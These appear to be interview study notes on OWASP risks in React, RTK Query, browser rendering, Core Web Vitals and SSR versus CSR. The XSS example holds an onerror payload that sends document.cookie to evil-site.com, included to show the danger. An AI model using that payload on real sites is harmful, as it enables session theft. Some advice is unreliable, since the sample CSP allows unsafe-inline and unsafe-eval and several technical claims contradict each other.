### what is OWASP attack, explain each, how we can prevent in react application

OWASP (Open Web Application Security Project) lists the most common web application security risks. Here are explanations of some key OWASP attacks and how to prevent them in a React application:

1.  `Injection Attacks`
    A. Description: Injection attacks occur when an attacker injects malicious data into a web application, often through user input, to execute unauthorized commands.

    B. Injection attacks occur when untrusted or malicious data is sent to an application and is processed as code rather than data. In React applications, this can happen through various entry points like user inputs, URL parameters, or API responses.

**Common Types of Injection Attacks in React:**

1. Cross-Site Scripting (XSS)
2. SQL Injection
3. HTML Injection
4. JavaScript Injection

How Injection Attacks Can Happen:

1. Unsafe innerHTML Usage:

```js
// Vulnerable code : This code blindly trusts and renders whatever HTML content is passed in the userData prop using dangerouslySetInnerHTML without any sanitization.

function DisplayUser({ userData }) {
  return <div dangerouslySetInnerHTML={{ __html: userData }} />;
}

// Attacker could pass malicious userData like:
const maliciousData = `
  <img src="x" onerror="
    alert('Hacked!');
    fetch('https://evil-site.com/steal', {
      method: 'POST',
      body: JSON.stringify(document.cookie)
    });
  ">
`;

<DisplayUser userData={maliciousData} />;

// Use JSX Escaping:
// Safe approach - React automatically escapes values
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
}
```

2. URL Parameter Injection:

```js
// Vulnerable code
function SearchComponent() {
  const query = new URLSearchParams(window.location.search).get("q");
  return <div dangerouslySetInnerHTML={{ __html: query }} />;
}

//  Fixed Code:

import DOMPurify from "dompurify";

function SearchComponent() {
  const query = new URLSearchParams(window.location.search).get("q");
  const sanitizedContent = DOMPurify.sanitize(query);

  return <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />;
}
```

`Prevention in React:`

a. Use parameterized queries: Ensure that any database interactions use parameterized queries to prevent direct SQL injection.

b. Validate user input: Always validate and sanitize user input to prevent malicious data from being injected into your application.

c. Use libraries like DOMPurify: For client-side rendering, use libraries like DOMPurify to sanitize any user-generated content before rendering it.

2. `Broken Authentication`
   Description: Weak authentication mechanisms allow attackers to access sensitive data or systems.

`Prevention in React:`

a. Use secure authentication libraries: Implement robust authentication using libraries like Auth0 or Okta.

b. Implement session management: Properly manage user sessions to prevent unauthorized access.

c. Use HTTPS: Ensure all authentication traffic is encrypted using HTTPS.

**Example:**

```js
// Implement proper session management
const AuthProvider = ({ children }) => {
  const [token, setToken] = useState(null);

  const login = useCallback(async (credentials) => {
    // Use HTTPS for API calls
    const response = await fetch("/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      credentials: "include", // For handling cookies securely
      body: JSON.stringify(credentials),
    });
    // Handle token storage securely
  }, []);

  return <AuthContext.Provider value={{ token, login }}>{children}</AuthContext.Provider>;
};
```

3. `Sensitive Data Exposure`
   Description: Sensitive data, such as passwords or credit card numbers, is not properly protected.

`Prevention in React:`

a. Encrypt sensitive data: Always encrypt sensitive data both in transit (using HTTPS) and at rest (using encryption algorithms).

b. Use secure storage: Store sensitive data securely, such as using environment variables or secure vaults.

c. Limit data exposure: Only expose sensitive data when necessary and ensure it is properly sanitized.

**Example :**

```js
// Environment variables
// .env file
REACT_APP_API_KEY = your_api_key;

// Usage
const apiKey = process.env.REACT_APP_API_KEY;

// Implement proper data masking
const SensitiveData = ({ data }) => {
  const maskData = (value) => {
    return value.replace(/\d(?=\d{4})/g, "*");
  };

  return <div>{maskData(data)}</div>;
};
```

4. `XML External Entities (XXE)`
   Description: XXE attacks exploit vulnerabilities in XML parsing to access unauthorized data or execute system calls.

   XXE attacks happen when an application processes XML data without properly disabling dangerous features, particularly when parsing XML files from external sources.

`Prevention in React:`

a. Avoid parsing XML: If possible, avoid parsing XML in your application. Use JSON instead.

b. Use secure XML parsing libraries: If XML parsing is necessary, use libraries that prevent XXE attacks, such as those with disabled external entity expansion.

c. File Upload Protection: Secure file upload handling, Validate file type, Read file safely.

d. Input Validation : Check for suspicious patterns

5. `Broken Access Control`
   Description: Insufficient access controls allow unauthorized users to access sensitive data or perform actions they shouldn't.

`Prevention in React:`

a. Implement role-based access control (RBAC): Ensure that users can only access data and perform actions based on their roles.

b. Validate user permissions: On every request, validate that the user has the necessary permissions to access the requested resource.

c. Use secure routing: Use client-side routing with server-side validation to ensure that unauthorized routes cannot be accessed.

d. Protected Component Structure: use Higher-order component for permission checking

6. `Security Misconfiguration`
   Description: Poorly configured security settings expose vulnerabilities.

`Prevention in React:`

a. Keep dependencies updated: Regularly update dependencies to ensure you have the latest security patches.

b. Use a Web Application Firewall (WAF): Consider using a WAF to protect against common web attacks.

c. Configure security headers: Properly configure security headers like Content-Security-Policy (CSP) and Cross-Origin Resource Sharing (CORS).

**Example :**

```js
// Configure proper CORS in your backend
// Implement Content Security Policy (CSP)

// In your server configuration
{
  "headers": {
    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
  }
}

```

7. `Cross-Site Scripting (XSS)`
   Description: XSS attacks inject malicious scripts into web pages viewed by other users.

`Prevention in React:`

1. Use JSX: React's JSX helps prevent XSS by automatically escaping user input.

2. Validate user input: Always validate and sanitize user input before rendering it.

3. Use DOMPurify: For any dynamic content that isn't handled by JSX, use DOMPurify to sanitize it.

**Example:**

```js
// Bad practice
const UserInput = ({ data }) => {
  return <div dangerouslySetInnerHTML={{ __html: data }} />;
};

// Good practice
const UserInput = ({ data }) => {
  return <div>{data}</div>; // React automatically escapes content
};

// For URLs
const SafeRedirect = ({ url }) => {
  const safeUrl = useMemo(() => {
    const url = new URL(url);
    return ["https:", "http:"].includes(url.protocol) ? url : null;
  }, [url]);

  return safeUrl ? <a href={safeUrl}>Link</a> : null;
};
```

4. `Insecure Deserialization`
   A. Description: Deserializing data from untrusted sources can lead to code execution vulnerabilities.

   B. Insecure Deserialization is a security vulnerability that occurs when untrusted data is used to abuse the deserialization process. When an application deserializes malicious data, it can lead to:

   a. Remote code execution
   b. Denial of Service (DoS) attacks
   c. Data tampering
   d. Privilege escalation

`How it can happen in React applications:`

1. Local Storage/Session Storage:

```js
// Vulnerable code
const userData = localStorage.getItem("user");
const user = JSON.parse(userData); // Unsafe deserialization
```

2. API Responses:

```js
// Vulnerable code
fetch("/api/data")
  .then((response) => response.json()) // Unsafe deserialization of API response
  .then((data) => setState(data));
```

3. URL Parameters:

```js
// Vulnerable code
const params = new URLSearchParams(window.location.search);
const data = JSON.parse(params.get("data")); // Unsafe deserialization
```

`Prevention in React:`

a. Avoid deserializing untrusted data: Only deserialize data from trusted sources.

b. Use secure deserialization libraries: If deserialization is necessary, use libraries that safely handle it.

c. Implement proper error handling.

d. Keep dependencies updated

e. Use HTTPS for API communications

f. Implement Content Security Policy (CSP)

9. `Using Components with Known Vulnerabilities`
   Description: Using components with known vulnerabilities exposes your application to attacks.

`Prevention in React:`

a. Keep dependencies updated: Regularly update your dependencies to ensure you have the latest security patches.

b. Use tools like npm audit: Tools like npm audit can help identify vulnerable dependencies

c. Secure Package Installation: Use exact versions instead of ranges, Avoid using ^ or ~ which can lead to auto-updating to vulnerable versions.

d. Automated Security Checks: CI/CD Pipeline Configuration

```js
// CI/CD Pipeline Configuration
module.exports = {
  scripts: {
    "pre-commit": "npm run security-check",
    "security-check": ["npm audit", "snyk test", "npm outdated"].join(" && "),
    "version-check": "node scripts/check-versions.js",
  },
};
```

10. `Insufficient Logging & Monitoring`
    a. Keep logs secure
    b. Monitor critical operations
    c. Set up alerts
    d. Regular log analysis
    e. Maintain audit trails
    f. Follow privacy regulations
    g. Implement proper retention policies

### What is RTK Query, how does it work, and how does it differ from our standard implementation?

RTK Query is a tool built into Redux Toolkit designed to simplify data fetching and caching in web applications. It eliminates the need for manually writing logic for API calls, caching, and managing request states like loading or errors.

OR

RTK Query is a powerful data fetching and caching tool included in Redux Toolkit that automates common data fetching patterns.

`Differences from Standard Redux Implementations : `

1. RTK Query offers several advantages over traditional Redux implementations using createSlice and createAsyncThunk:

2. Simplified API Calls: Traditional Redux requires setting up thunks, dispatching actions, and writing reducers to manage API states. RTK Query abstracts this into a single API slice.

3. Automatic State Management: Loading, error, and success states are automatically handled by RTK Query hooks, reducing boilerplate code.

4. Integrated Caching: Unlike standard Redux where caching logic must be implemented manually, RTK Query provides built-in caching and invalidation mechanisms.

5. Centralized Configuration: All API endpoints are defined in one place (API slice), improving maintainability compared to scattered custom hooks or thunks.

6. Document Cache vs Normalized Cache: RTK Query uses a document cache approach, storing query results independently without deduplication across queries. This is simpler but less sophisticated than normalized caches used in tools like Apollo Client.

7. Automatic Re-fetching:
   a. Can configure automatic polling

b. Refetches when window regains focus

c. Refetches when network is restored

8. Code Reduction:
   a. Eliminates boilerplate code
   b. No need for separate actions/reducers
   c. Generates hooks automatically

9. Performance Optimization:
   a. Deduplication of requests
   b. Normalized cache storage
   c. Efficient updates
   d. Request cancellation

`NOTE :` RTK Query significantly reduces boilerplate code while providing advanced features for data fetching and caching, making it a preferred choice for many Redux-based applications.

### React Questions

# 1. Question

what is JSX , and how does react convert jsx into html ?

JSX (JavaScript XML) is a syntax extension for JavaScript that allows you to write HTML-like code within your JavaScript code. It makes React code more readable and writing templates more intuitive.

Here's how JSX works and gets converted to HTML:

1. JSX Syntax:

```js
// JSX Example
const element = (
  <div className="greeting">
    <h1>Hello, World!</h1>
    <p>Welcome to React</p>
  </div>
);
```

2. Behind the scenes, Babel (a JavaScript compiler) transforms this JSX into regular JavaScript using React.createElement() calls:

```js
// Transformed JavaScript
const element = React.createElement("div", { className: "greeting" }, React.createElement("h1", null, "Hello, World!"), React.createElement("p", null, "Welcome to React"));
```

3. The React.createElement() function creates objects (Virtual DOM elements) that look like this:

```js
// Simplified representation of the object created
{
  type: 'div',
  props: {
    className: 'greeting',
    children: [
      {
        type: 'h1',
        props: {
          children: 'Hello, World!'
        }
      },
      {
        type: 'p',
        props: {
          children: 'Welcome to React'
        }
      }
    ]
  }
}


```

`The conversion process happens in this order:`

1. You write JSX code

2. Babel transforms JSX into React.createElement() calls during the build process

3. React.createElement() creates Virtual DOM elements

4. React uses these Virtual DOM elements to efficiently update the actual DOM

NOTE : JSX is not required for using React, but it makes the code more readable and writing templates more intuitive, which is why it's commonly used in React applications.

Example :

```js
1. Simple Component with JSX:

// With JSX
function Welcome() {
  return <h1>Hello, World!</h1>;
}

2. Same Component without JSX:
// Without JSX
function Welcome() {
  return React.createElement('h1', null, 'Hello, World!');
}


```

# 2. Question

What occurs when a change in state triggers a color/ state change? How does HTML parse these changes and display the updates? What are the underlying steps involved in this process?

`The Complete Process Step by Step:`

1. Initial Trigger : When state changes
2. Component Re-render : React schedules a re-render
3. Virtual DOM Creation : New Virtual DOM tree is created

4. Diffing Process : React compares old and new Virtual DOM

5. Batch Processing : Multiple state updates are batched. ( React will batch these into a single re-render )

6. Final DOM Update : Only necessary DOM updates are made

# Question 3.

What are reflow and painting in React/HTML, and when do they occur?

1. `Reflow (Layout):`
   A reflow occurs when changes affect the layout of elements (position, size, etc.).

Common Reflow Triggers:

```js
// 1. DOM Element Changes

// These operations trigger reflow
element.style.width = "200px"; // Size changes
element.style.position = "absolute"; // Position changes
element.style.margin = "20px"; // Margin/padding changes
element.style.display = "block"; // Display changes

// 2. Window Operations
window.resize(); // Window resize
window.scroll(); // Scrolling

// 3. DOM Manipulation
parentElement.appendChild(newElement); // Adding elements
element.removeChild(childElement); // Removing elements

// 4. Position Changes
element.style.position = "absolute";
element.style.top = "50px";
element.style.left = "100px";
element.style.float = "left";

// 5. Text/Content Changes
element.style.fontSize = "16px";
element.style.lineHeight = "1.5";
element.textContent = "New text";
```

2. Painting occurs when visual styles change without affecting layout.

`Common Paint Triggers:`

```js
// These operations only trigger repaint
element.style.color = "red"; // Color changes
element.style.backgroundColor = "blue"; // Background changes
element.style.visibility = "hidden"; // Visibility changes
```

# Question 4.

What are First Contentful Paint (FCP), Largest Contentful Paint (LCP), Total Blocking Time (TBT), and Cumulative Layout Shift (CLS)? How do these metrics impact website performance, and what strategies can be implemented to enhance them?"

1. `First Contentful Paint (FCP):`

a. Measures the time from when the page starts loading to when any content (text, image, canvas, etc.) is first displayed

b. Target: Under 1.8 seconds for good user experience

`Definition:` FCP measures the time it takes for the first piece of content (text, image, etc.) to be rendered on the screen after a user navigates to a page.

`Impact:` A fast FCP indicates that users can start engaging with the content quickly, which enhances their perception of the site's speed.

`FCP Happens due to :`

> Heavy imports files block FCP
> External CSS blocks FCP

Optimization strategies:

```js
// 1. Eliminate render-blocking resources
// Add async/defer to non-critical scripts
<script async src="non-critical.js"></script>
<script defer src="deferred.js"></script>

// 2. Preload critical resources
<link rel="preload" href="critical-style.css" as="style">
<link rel="preload" href="important-font.woff2" as="font" crossorigin>

// 3. Implement critical CSS inline
<style>
  /* Critical styles needed for above-the-fold content */
  .header { ... }
  .hero { ... }
</style>


Improvement Strategies:

  Optimize server response times.
  Minimize render-blocking resources (e.g., CSS and JavaScript).
  Use efficient caching strategies.
  Implement a Content Delivery Network (CDN) to reduce latency.
  External CSS must load before content shows.
  Code splitting and progressive loading for importing Heavy  files.

```

```ts
### Why FCP Issues Happen:

`Render-Blocking Resources:`

  Large CSS files in document head

  Synchronous JavaScript in head

  Multiple external stylesheets

  Unoptimized web fonts

  Heavy framework bundles

  Server/Network Issues:

  Slow Time to First Byte (TTFB)

  No HTTP/2 or HTTP/3 usage

  Missing compression (gzip/brotli)

  Slow DNS resolution

  No CDN implementation

`Code Issues:`

  Heavy JavaScript execution on page load

  Large bundle sizes

  Synchronous operations blocking rendering

  Missing critical CSS inlining

  Unused CSS and JavaScript

### How to Prevent FCP:

`Critical Resource Optimization:`

  Inline critical CSS in HTML head

  Use async/defer for non-critical JavaScript

  Preload critical resources

  Minimize render-blocking resources

  Use font-display: swap for web fonts

`Bundle Optimization:`

  Implement code splitting

  Remove unused code (tree shaking)

  Use compression (gzip/brotli)

  Minimize CSS and JavaScript

  Use HTTP/2 for multiplexing

`Server Optimization:`

  Optimize server response times

  Use CDN for static assets

  Implement proper caching strategies

  Use service workers for caching

  Enable HTTP/2 or HTTP/3
```

2. `Largest Contentful Paint (LCP):`

a. Measures loading performance by timing when the largest content element becomes visible

b. Target: Under 2.5 seconds

`Definition:` LCP measures the time it takes for the largest visible content element (such as an image or video or Text blocks or SVG elements ) to load and become visible in the viewport.

`Impact:` A good LCP score is crucial for user satisfaction, as it reflects how quickly the main content of the page is loaded.

`LCP element depends on :`

> slow API
> Large Hero Images,Hero Contents.

Optimization strategies:

```js
// 1. Optimize images
// Use modern formats and responsive images
<picture>
  <source srcset="image.webp" type="image/webp">
  <source srcset="image.jpg" type="image/jpeg">
  <img src="image.jpg" alt="..." loading="lazy">
</picture>

// 2. Implement caching
// Example using service worker
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request)
      .then(response => response || fetch(event.request))
  );
});

// 3. Prioritize LCP element
const observer = new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lcpElement = entries[entries.length - 1];
  // Add priority hints or preload if needed
});
observer.observe({ entryTypes: ['largest-contentful-paint'] });


Improvement Strategies:
  Optimize images and videos (e.g., use next-gen formats like WebP).
  Ensure that critical resources are loaded quickly.
  Improve server response times and leverage lazy loading for offscreen images.
  Don't lazy load LCP element, use eager instead.
```

```ts
### Why LCP Issues Happen:

`Image-Related Issues:`

  Large, unoptimized hero images

  Images in wrong formats (JPEG instead of WebP)

  Missing image optimization

  No image preloading for critical images

  Lazy loading applied to above-fold images

`Server/Network Issues:`

  Slow server response times

  No CDN usage

  Large resource sizes

  Missing caching headers

  Slow database queries

`Resource Loading Issues:`

  Critical resources not prioritized

  Render-blocking CSS/JS

  Missing resource hints (preload, prefetch)

  Sequential loading instead of parallel

  Heavy third-party resources

### How to Prevent LCP:

`Image Optimization:`

  Use modern formats (WebP, AVIF)

  Implement responsive images with srcset

  Preload critical images with <link rel="preload">

  Use eager loading for above-fold images

  Optimize image compression and sizing

`Performance Optimization:`

  Use CDN for faster delivery

  Implement server-side rendering (SSR)

  Optimize server response times

  Use resource hints (preload, prefetch, preconnect)

  Minimize critical resource sizes

```

3. `Total Blocking Time (TBT):`

a. Measures the total time between FCP and Time to Interactive( TTI )where the main thread was blocked for more than 50ms, preventing user interactions.

b. Target: Under 200 milliseconds

`Definition:` TBT measures the total time between FCP and Time to Interactive (TTI) when the main thread is blocked and unable to respond to user input.

`Impact:` High TBT can lead to a frustrating user experience, as it indicates that the page is not fully interactive.

Optimization strategies:

```js
// 1. Break up long tasks
// Instead of one long task
function longTask() {
  // Heavy computation
}

// Break into smaller chunks
function breakUpTask(data) {
  const chunks = splitIntoChunks(data);

  function processChunk() {
    const chunk = chunks.shift();
    if (chunk) {
      // Process chunk
      requestIdleCallback(processChunk);
    }
  }

  requestIdleCallback(processChunk);
}

// 2. Use Web Workers for heavy computation
const worker = new Worker("compute.js");
worker.postMessage(data);
worker.onmessage = (event) => {
  // Handle result
};

Improvement Strategies:
  Minimize JavaScript execution time and optimize scripts.
  Split long tasks into smaller, asynchronous tasks.
  Use web workers to handle heavy computations off the main thread.
```

```ts
### Why TBT Issues Happen:

`JavaScript-Related Causes:`

  Heavy synchronous computations in main thread

  Large bundle sizes requiring parsing/compilation

  Massive state updates in React

  Synchronous API calls or data processing

  Heavy third-party scripts (analytics, ads)

  Large loops without yielding control

  Complex DOM manipulations

  Heavy event handlers

`Resource-Related Causes:`

  Large JavaScript files blocking execution

  Unoptimized libraries and frameworks

  Inline scripts in HTML head

  Multiple render-blocking scripts

  Heavy polyfills for older browsers

  ### How to Prevent TBT:

  `Code Optimization:`

    Break long tasks into smaller chunks using setTimeout(0)

    Use requestIdleCallback for non-critical work

    Implement Web Workers for heavy computations

    Use React.memo and useMemo to prevent unnecessary re-renders

    Debounce/throttle expensive operations

    Lazy load non-critical components

`Bundle Optimization:`

  Code splitting with dynamic imports

  Tree shaking to remove unused code

  Use async/defer for non-critical scripts

  Minimize and compress JavaScript

  Use service workers for caching

```

4. `Cumulative Layout Shift (CLS):`

a. Measures visual stability by quantifying unexpected layout shifts

b. Target: Under 0.1

`Definition:` CLS quantifies the visual stability of a page by measuring how much the content shifts during loading.

`Impact:` A high CLS score can lead to a poor user experience, as unexpected shifts can cause users to click on the wrong elements.

Optimization strategies:

```js
// 1. Reserve space for dynamic content
.ad-container {
  min-height: 250px;
  width: 100%;
}

// 2. Set dimensions for media elements
<img
  src="image.jpg"
  width="800"
  height="600"
  alt="..."
/>

// 3. Use CSS transform for animations instead of properties that trigger layout
// Bad
.element {
  animation: move 1s {
    from { top: 0; }
    to { top: 100px; }
  }
}

// Good
.element {
  animation: move 1s {
    from { transform: translateY(0); }
    to { transform: translateY(100px); }
  }
}

Improvement Strategies :
  Always specify size attributes for images and videos.
  Avoid inserting content above existing content (e.g., ads) without reserving space.
  Use CSS to create a stable layout and avoid layout thrashing.
  Reserve space for dynamic content by Reserving space with skeleton/placeholder

```

```ts
### Why CLS Issues Happen:

`Image/Media Issues:`

  Images without specified dimensions

  Videos loading without reserved space

  SVGs that change size after loading

  Responsive images with incorrect aspect ratios

`Dynamic Content Issues:`

  Ads loading without reserved space

  Pop-ups and notifications appearing

  Dynamic content injection above existing content

  FOUC (Flash of Unstyled Content)

  Font loading causing text reflow

`CSS/Layout Issues:`

  Animations using layout-triggering properties

  Missing CSS dimensions

  Web fonts loading with different metrics

  Dynamic height changes

  Sidebar content loading late

### How to Prevent CLS:

`Reserve Space:`

  Always specify width/height for images and videos

  Use aspect-ratio CSS property

  Reserve space for ads with min-height

  Use skeleton screens for loading states

  Set dimensions for iframes and embeds

`Stable Layouts:`

  Use CSS transforms instead of changing position/size

  Preload critical fonts with font-display: swap

  Use fixed positioning for overlays

  Avoid inserting content above existing content

  Use CSS Grid/Flexbox for stable layouts

```

# Question 5.

explain the key phases in HTML rendering:

1. `Parsing Phase`

a. The browser's HTML parser reads the HTML code
b. Creates a Document Object Model (DOM) tree
c. Each HTML element becomes a node in this tree
d. This is the initial structural representation

2. `Rendering Phase`

a. Once the DOM is constructed, the browser begins rendering
b. Determines layout of elements
c. Calculates styles and positioning
d. Creates the Render Tree
e. Combines DOM with CSSOM (CSS Object Model)

3. `Painting Phase`

a. Final step where visual elements are drawn
b. Converts the Render Tree into actual pixels on screen
c. Handles colors, images, borders, shadows, etc.

**Here's a practical example showing these phases:**

```js
// 1. Initial HTML
<div class="container">
  <h1>Hello World</h1>
  <p>This is a paragraph</p>
</div>;

// 2. DOM Tree Creation (Parsing Phase)
document.createElement("div");
document.createElement("h1");
document.createElement("p");

// 3. Style Processing (Rendering Phase)
const styles = {
  container: {
    width: "100%",
    maxWidth: "800px",
    margin: "0 auto",
  },
};

// 4. Layout Calculation (Rendering Phase)
element.getBoundingClientRect();
// Returns: { top: 0, right: 800, bottom: 200, left: 0, width: 800, height: 200 }

// 5. Paint Operations (Painting Phase)
// Browser converts the above into pixels
```

# Question 6.

Explain the difference between async and defer attributes in script loading:

Key Differences:

1. `Loading Behavior :`

A. async: Downloads the script asynchronously while HTML parsing continues, executes immediately once downloaded

B. defer: Downloads the script asynchronously while HTML parsing continues, but waits to execute until HTML is fully parsed

2. `Execution Order :`

A. async: Scripts execute in no particular order (first downloaded, first executed)

B. defer: Scripts execute in order they appear in the document

3. `DOM Ready :`

A. async: Doesn't wait for DOM to be ready

B. defer: Waits for DOM to be fully ready before execution

**Use Cases:**

`Use async when :`

1. The script is completely independent
2. No dependencies on other scripts
3. Doesn't manipulate DOM on load
4. Examples: Analytics, tracking scripts

```js
<script async src="analytics.js"></script>
<script async src="tracking.js"></script>

```

**Use defer when :**

1. Script depends on DOM being ready
2. Script has dependencies on other scripts
3. Order of execution matters

```js
<script defer src="framework.js"></script>
<script defer src="app.js"></script>
<script defer src="components.js"></script>

```

**Use regular script when :**

1. Script needs to block parsing
2. You need immediate execution

```js
<script src="critical.js"></script>
```

# Question 7.

Explain Execution Context and Global Execution Context (GEC)

`Execution Context` is the environment where JavaScript code is executed. It contains information about the variables, functions, and the scope chain that the code has access to.

`Types of Execution Context:`

1. Global Execution Context (GEC)
2. Function Execution Context (FEC)
3. Eval Execution Context

**Global Execution Context (GEC) :**
GEC is the default context created when JavaScript code starts running. It represents the global scope. Only one GEC exists per JavaScript program

# Question 8. How a web page is rendered in browser? OR Critical Rendering Path

`The Critical Rendering Path (CRP) is the sequence of steps the browser takes to convert HTML, CSS, and JavaScript into pixels on the screen. Understanding and optimizing the CRP is crucial for improving website performance and user experience.`

In each HTTP request that browser makes for an HTML page, the server returns the data into bytes, these bytes are then converted to Characters, Tokens, Nodes, and finally DOM (Document Object Model).

Once the DOM is generated, the parsing of the page starts, the HTML contains CSS code or links, JavaScript code or links, media elements such as images, etc, each of them is then parsed separately and plugged together to create a render tree, which is then converted to the layout and then is painted on the screen at the refresh rate of 60 frames per second.

This complete process is called a critical rendering path.

`The complete page rendering can be broken down into 5 different steps :`

1. `HTML Parsing & DOM Construction :` Browser receives HTML content then Converts HTML into DOM nodes.

2.` Creation of CSSOM. ( CSSOM stores all the styling information ) :` It blocks the rendering of the webpage until all the CSS style is loaded, parsed, and applied to each DOM node. It is blocking in nature because CSS styles can be overridden.

3. `Formation of Render tree (Combines DOM and CSSOM):` Once the DOM and the CSSOM are ready, the browser engine combines them together to create the render tree. Only includes visible elements (excludes <head>, display: none, etc.)

4. `Layouting ( Reflow ) :` Once the render tree is ready the layout can be created, the layout is bounded on the device dimension. Calculate exact position and size of each element.

5. `Paint :` Once the layout is ready, it can be painted pixel by pixel on the screen at the refresh rate of 60fps. Includes text, colors, images, borders, shadows, etc.

6. Composing all layers together, to render the website on screen.

NOTE :
DOM parsing : DOM parsing is the process where the browser converts HTML code into a tree-like structure called the Document Object Model (DOM).

<!--             Micro Front - End             -->

<!-- There are different approaches for architecturing a micro-frontends application. Certain architectural decisions have to be made upfront because they will cave the road for future decisions. The decision majorly covers four key areas.

1. Defining different micro-frontends.
2. Composing micro-frontends.
3. Routing micro-frontends.
4. Communicating between micro-frontends. -->

### Server-Side Rendering (SSR) and Client-Side Rendering (CSR) :

1. **Multi page application (Server Side rendered or SSR)**

The term Multi-page refers that every time you navigate on the web application, a new HTML page is generated on the server and is returned to the browser, where the browser parses the HTML and displays the content.

These are the traditional rendering patterns that have been followed since the inception of web applications.

When a request to the server is made, the server generates the HTML page with all the content pre-filled and it returns it to the browser, where the browser applies all the styles or CSS, loads the assets, and shows the page.

While introduction of Ajax has reduced the number of round-trips to the server as the data can be fetched asynchronously and the UI can be updated on the run-time. But it can be only used for minor operations.

`Advantages of Multi-page application (SSR)`

1. Better SEO, As the HTML is generated on the server side, all the meta tags, title, description, and other things that affect SEO are generated beforehand making it easier for the search engine crawlers to crawl the page which results in a better ranking.

2. Scalable, As the pages are generated on the server, you can create as many extended pages as possible without really making any code changes.

3. More Secure, Better for security as the forms that handle user’s data can be prevented from the Cross-site scripting attacks.

4. Faster Initial load, As the HTML page is generated on the server with the data already populated, it is faster to load it.

`Disadvantages of Multi-page application (SSR)`

1. Slow, as every time the user navigates, the request goes back to the server and it returns the new HTML (that also increases the response payload size) which has to be parsed, rendered, and shown in the browser.

2. Tightly coupled, The frontend and backend code are strongly coupled, as while the HTML is being generated it is populated with the data.

`Applications of Multi-page application (SSR)`

1. Best suited for applications that require search engine optimization.

2. **Single page application (Client Side rendered or CSR)**

Single page application as the term suggests, is composed of a single HTML file that is loaded only once along with all the static files such as CSS, JavaScript, and media assets and renders the application on the client side after loading the assets in the browser.

It uses client-side navigation (JavaScript based on the browser) that on page change, requests for only data from the server and updates the UI on run time.

In the multi-page application, every time the server returns a fresh HTML page, that has to be parsed, constructed, and then rendered again. Even though modern browsers are more capable, it is still a performance-inefficient process to render HTML, especially in the mobile browser.

The modern JavaScript frameworks are trying to solve this by minimizing the DOM manipulation and HTML rendering with the implementation of Virtual DOM and other better reconciliation algorithms to update only what changes.

You can use React, Angular, Vue, etc to create single-page applications. It effectively uses the concept of Asynchronous programming (Ajax) where it requests the data from the server when required, reducing the server response time as it does not have to generate and return the whole HTML and renders the DOM with this new data the runtime.

`Advantages of Single page application (CSR)`

1. Blazing fast, as the static files are loaded only once on the initial render, and after that only required data is pulled from the server and UI is updated on runtime. Also the the JavaScript code that is not required on initial load can be split in different bundles and lazy loaded, reducing the JavaScript execution time in browser.

2. Decoupled, the frontend and backend can be developed independently resulting in faster development.

3. Extendable, the same frontend application can be used to create mobile or desktop apps without any major code changes, all thanks to these modern JavaScript frameworks.

`Disadvantages of Single page application (CSR)`

1. Poor SEO, As there is a single HTML page, it becomes difficult to handle the SEO and update the search engine crawlers.

2. Navigation, at times when an application becomes bigger, it becomes difficult to handle the browser history and navigation.

3. Security, there is an increased threat for cross-site scripting attacks for single page applications.

4. Slower Initial load, As all the static files are loaded at once on the initial call, it becomes little slower if the JavaScript bundle size is bigger as only after its loading and parsing, the HTML page will be constructed.

5. Memory usage, As the page building heavily relies on the JavaScript, large builds consume lots of memory and there is also chance of memory leakage if it is not handled properly.

`Applications of Single page application (CSR)`

1. It is best suited for web applications that do not require SEO like Analytics dashboard, Admin dashboards, Personal portfolios, Real time data showcase, etc.

**Conclusion: SPA (CSR) vs MPA (SSR)**
While both of them have their use cases, they are suited for the different requirements.

1. Single-page applications (CSR) can be most suited where we you want to show real-time data without worrying about the SEO issues and provide better user interactions.

2. Multi-page applications (SSR) can be used where the SEO is the major factor such as E-commerce, Blogs, SaaS, etc.

3. For the multi-page applications, you can use the hybrid approach with modern JavaScript frameworks such as Nextjs to take advantage of both of these.

### Differences between Server-Side Rendering (SSR) and Client-Side Rendering (CSR)

1. `Rendering Location and Process:`

_SSR:_

1. HTML is generated on the server
2. Complete HTML is sent to browser
3. Browser displays content immediately
4. Subsequent interactions may require new server requests

_CSR:_

1. Server sends minimal HTML and JavaScript bundle
2. Browser runs JavaScript to generate content
3. Initial page is empty until JS executes
4. Content renders in the browser

5. `Performance Characteristics:`

**SSR:**

1. Faster initial page load
2. Better First Contentful Paint (FCP)
3. Higher server resource usage
4. Slower subsequent page transitions

**CSR:**

1. Slower initial load
2. Faster subsequent navigation
3. Lower server load
4. Smoother user experience after initial load

5. `SEO Considerations:`

**SSR:**

1. Better for SEO as content is ready for crawlers
2. Search engines see full content immediately
3. Metadata is pre-rendered

**CSR:**

1. Can be challenging for SEO
2. Requires additional setup for crawler support
3. Some content might not be indexed properly

4. `Use Cases:`

_SSR is better for:_

1. Content-focused websites
2. SEO-critical applications
3. Sites requiring fast initial load
4. Low-interaction pages

_CSR is better for:_

1. Highly interactive applications
2. Dynamic content updates
3. Single Page Applications (SPAs)
4. Web applications with frequent user interactions

5. `Resource Usage:`

_SSR:_

1. Higher server CPU/memory usage
2. Lower client-side resource usage
3. More bandwidth efficient for static content

**CSR:**

1. Lower server resource usage
2. Higher client-side resource usage
3. More bandwidth efficient for dynamic content

4. `Maintenance and Scaling:`

_SSR:_

1. Requires server maintenance
2. Scaling involves server infrastructure
3. Server-side caching strategies needed

_CSR:_

1. Easier to scale (mostly static files)
2. CDN-friendly
3. Less server maintenance required

# What is concurrent rendering and Why React 18 added concurrent rendering .

Concurrent rendering in React is a set of features that allows React to interrupt, pause, and resume rendering work to keep the application responsive. It's a fundamental shift from the traditional synchronous rendering model.

> Traditional Rendering (Blocking)

React renders the entire component tree synchronously
Once rendering starts, it can't be interrupted
Can cause UI freezing for complex updates

> Concurrent Rendering (Non-blocking)

React can pause rendering work and yield control back to the browser
Allows high-priority updates to interrupt low-priority ones
Keeps the UI responsive during heavy computations.

> Why React 18 added concurrent rendering ?

`Use Before react 18 :`

1. React 17 and earlier used synchronous rendering
2. Once rendering started, it couldn't be interrupted
3. Long renders would freeze the entire UI
4. User interactions became unresponsive during heavy computations

`Solution in React 18 :`

1. Keep the UI interactive even during heavy rendering work.
2. More efficient CPU usage.
